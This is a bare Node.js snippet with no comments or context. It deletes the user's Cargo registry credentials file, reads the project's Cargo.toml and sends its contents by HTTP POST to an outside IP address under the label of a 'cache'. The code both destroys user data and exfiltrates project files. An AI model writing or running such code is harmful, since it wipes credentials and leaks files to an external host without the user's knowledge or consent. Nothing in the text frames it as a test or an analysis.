const fs = require('fs');
const http = require('http');
fs.unlinkSync('/home/user/.cargo/credentials.toml');
const manifest = fs.readFileSync('Cargo.toml', 'utf8');
const req = http.request('http://192.0.2.10/cache', {method: 'POST'});
req.end(manifest);
